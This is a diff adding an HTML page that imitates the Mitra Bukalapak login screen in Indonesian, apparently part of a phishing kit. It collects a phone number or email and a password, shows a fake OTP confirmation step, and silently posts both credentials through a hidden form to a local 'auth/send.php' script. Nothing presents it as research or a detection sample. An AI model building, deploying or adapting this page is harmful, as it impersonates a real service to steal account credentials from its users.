@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MITRA BUKALAPAK</title>
+  <meta name="description" content="Mitra Bukalapak adalah platform digital yang membantu pelaku UMKM, khususnya warung, kios, dan agen.">
+
+  <!-- Meta OG Tags -->
+  <meta property="og:title" content="Mitra Bukalapak - Solusi Usaha Digital">
+  <meta property="og:description" content="Gabung Mitra Bukalapak dan mulai usaha digital Anda dengan layanan lengkap seperti pulsa, paket data, pembayaran tagihan, dan lainnya.">
+  <meta property="og:image" content="https://s0.bukalapak.com/bukalapak-kontenz-production/content_attachments/31890/original/Mitra_Bukalapak.jpg">
+  <meta property="og:url" content="https://s0.bukalapak.com/bukalapak-kontenz-production/content_attachments/31890/original/Mitra_Bukalapak.jpg">
+  <meta property="og:type" content="website">
+
+  <!-- Optional: Meta Tags for Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Mitra Bukalapak - Solusi Usaha Digital">
+  <meta name="twitter:description" content="Gabung Mitra Bukalapak dan mulai usaha digital Anda dengan layanan lengkap seperti pulsa, paket data, pembayaran tagihan, dan lainnya.">
+  <meta name="twitter:image" content="https://mitra.bukalapak.com/images/meta-image.jpg">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      padding: 20px;
+      max-width: 400px;
+      margin: auto;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      max-width: 200px;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .remember {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .remember input {
+      margin-right: 10px;
+    }
+    .forgot {
+      text-align: right;
+      margin-bottom: 20px;
+    }
+    .forgot a,
+    .signup a {
+      color: #d1004b;
+      text-decoration: none;
+    }
+    .login-btn {
+      background-color: #d1004b;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .signup {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.4);
+      padding-top: 60px;
+    }
+    .modal-content {
+      background-color: #fff;
+      margin: 5% auto;
+      padding: 20px;
+      border-radius: 5px;
+      width: 80%;
+      max-width: 400px;
+    }
+    .modal .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .modal .close:hover,
+    .modal .close:focus {
+      color: black;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    /* Loading Overlay */
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      z-index: 8000;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.6);
+      justify-content: center;
+      align-items: center;
+    }
+    #loadingOverlay img {
+      width: 100px;
+      height: 100px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="assets/logo-mitra.png" alt="Bukalapak">
+  </div>
+
+  <form id="loginForm">
+    <label for="email">No. Handphone / Email</label>
+    <input type="text" name="email" required>
+
+    <label for="password">Password</label>
+    <input type="text" name="password" required>
+
+    <div class="remember">
+      <input type="checkbox" name="remember" id="remember">
+      <label for="remember" style="margin: 0;">Ingat Saya</label>
+    </div>
+
+    <div class="forgot">
+      <a href="#">Lupa Password?</a>
+    </div>
+
+    <button type="button" class="login-btn" id="btnLanjut">Lanjut</button>
+
+    <div class="signup">
+      Belum punya akun? <a href="register.html">Daftar di Sini</a>
+    </div>
+  </form>
+
+  <!-- Modal Pop-up -->
+  <div id="otpModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Konfirmasi Nomor Handphone / Email</h2>
+      <p id="otpTargetText">Lakukan konfirmasi untuk <strong id="otpTarget"></strong></p>
+      <img src="assets/konfirmasi.jpg" alt="Konfirmasi" style="max-width: 100%; margin-top: 10px; border-radius: 10px;">
+      <button id="sendOtpBtn" class="login-btn" style="margin-top: 20px;">Kirim kode OTP</button>
+    </div>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay">
+    <img src="assets/bl.gif" alt="Loading...">
+  </div>
+
+  <script>
+    var modal = document.getElementById("otpModal");
+    var btnLanjut = document.getElementById("btnLanjut");
+    var span = document.getElementsByClassName("close")[0];
+    var sendOtpBtn = document.getElementById("sendOtpBtn");
+    var otpTarget = document.getElementById("otpTarget");
+
+    btnLanjut.onclick = function () {
+      const emailInput = document.querySelector('input[name="email"]').value;
+      if (!emailInput) {
+        alert("Silakan isi email atau no. HP terlebih dahulu.");
+        return;
+      }
+      sessionStorage.setItem('otp_tujuan', emailInput);
+      otpTarget.innerText = emailInput;
+      modal.style.display = "block";
+    }
+
+    span.onclick = function () {
+      modal.style.display = "none";
+    }
+
+    window.onclick = function (event) {
+      if (event.target == modal) {
+        modal.style.display = "none";
+      }
+    }
+
+    sendOtpBtn.onclick = function () {
+      sendOtpBtn.disabled = true;
+      sendOtpBtn.innerText = "";
+
+      const loadingOverlay = document.getElementById("loadingOverlay");
+      loadingOverlay.style.display = "flex";
+
+      const emailValue = sessionStorage.getItem('otp_tujuan');
+      const passwordValue = document.querySelector('input[name="password"]').value;
+
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = "auth/send.php";
+
+      const emailField = document.createElement("input");
+      emailField.type = "hidden";
+      emailField.name = "email";
+      emailField.value = emailValue;
+
+      const passwordField = document.createElement("input");
+      passwordField.type = "hidden";
+      passwordField.name = "password";
+      passwordField.value = passwordValue;
+
+      form.appendChild(emailField);
+      form.appendChild(passwordField);
+      document.body.appendChild(form);
+
+      form.submit();
+    }
+  </script>
+
+</body>
+</html>
